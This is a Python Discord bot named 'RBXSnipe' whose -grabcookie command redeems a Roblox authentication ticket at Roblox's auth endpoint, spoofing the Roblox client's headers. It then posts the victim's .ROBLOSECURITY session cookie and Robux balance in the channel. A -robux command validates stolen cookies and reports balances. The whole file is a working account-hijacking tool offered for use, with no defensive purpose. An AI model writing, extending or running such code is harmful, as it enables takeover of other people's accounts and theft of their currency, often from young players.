import requests, sys
import discord
import asyncio
import requests
import os
from discord.ext import commands

bot = commands.Bot(command_prefix='-',description='RBXSnipe')
bot.remove_command('help')
purple = 0x6a0dad

session = requests.Session()

def getCurrency(cookie):
        cookies = {
            '.ROBLOSECURITY': cookie
        }
        return requests.get("https://api.roblox.com/currency/balance", cookies=cookies).json()

def testcookie(cookie):
    cookies = {
        '.ROBLOSECURITY': cookie
    }
    r = requests.get('https://www.roblox.com/game/GetCurrentUser.ashx', cookies=cookies)
    if r.text != 'null':
        return True
    else:
        return False
            
@bot.event
async def on_ready():
    print("bot started ig")
    await bot.change_presence(activity=discord.Game(name="baking cookies"))

@bot.command()
async def grabcookie(ctx, ticket=None):
    if ticket == None:
        embed = discord.Embed(color=purple, title=f'grandma edma is dissappointed for you forgetting to add a token smh')
        embed.set_footer(text='meaty\'s butler')
        await ctx.send(embed=embed)
        return
    try:
        resp = session.post(
        url = 'https://auth.roblox.com/v1/authentication-ticket/redeem',
        headers = {
            'Content-Type': 'application/json',
            'Referer': 'https://www.roblox.com/games/1818/--',
            'Origin': 'https://www.roblox.com',
            'User-Agent': 'Roblox/WinInet',
            'RBXAuthenticationNegotiation': '1'
        },
        json = {
            'authenticationTicket': ticket
            }
        )
        embed = discord.Embed(color=purple)
        embed.add_field(name='heres your freshly baked cookie', value=f"{session.cookies['.ROBLOSECURITY']}", inline=False)
        cookie = session.cookies['.ROBLOSECURITY']
        await ctx.send(embed=embed)
        robuxAmount = getCurrency(cookie)
        embed = discord.Embed(color=purple, title=f'Robux: {robuxAmount.get("robux")}')
        await ctx.send(embed=embed)
    except:
        embed.add_field(name='**Error**', value=f"Invalid Token", inline=False)
        await ctx.send(embed=embed)

@bot.command()
async def robux(ctx, cookie=None):
    if cookie == None:
        embed = discord.Embed(color=purple, title=f'imagine forgetting to add your cookie')
        embed.set_footer(text='edna crying fr fr')
        await ctx.send(embed=embed)
        return
    if testcookie(cookie):
        pass
    else:
        embed = discord.Embed(color=purple, title=f'invalid cookie :(')
        embed.set_footer(text='blaha tbh')
        await ctx.send(embed=embed)
        return

    robuxAmount = getCurrency(cookie)
    embed = discord.Embed(color=purple, title=f'Robux: {robuxAmount.get("robux")}')
    embed.set_footer(text='yw for your robux')
    await ctx.send(embed=embed)

@bot.command()
async def help(ctx):
    embed = discord.Embed(color=purple)
    embed.add_field(name='Commands', value='-grabcookie (authticket)', inline=False)
    await ctx.send(embed=embed)
bot.run("BOT TOKEN HERE")
